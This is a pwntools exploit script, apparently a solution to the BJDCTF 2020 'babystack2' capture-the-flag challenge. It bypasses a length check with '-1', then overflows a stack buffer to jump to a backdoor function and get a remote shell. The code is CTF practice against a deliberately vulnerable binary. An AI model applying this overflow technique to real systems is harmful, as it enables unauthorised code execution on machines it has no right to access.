from pwn import *

io = remote('node4.buuoj.cn', 29944)
elf = ELF('./bjdctf_2020_babystack2')
backdoor = elf.symbols['backdoor']
io.recv()
io.sendline(b'-1')
payload = b'a'*0x18 + p64(backdoor)
io.sendlineafter(b"[+]What's u name?", payload)
io.interactive()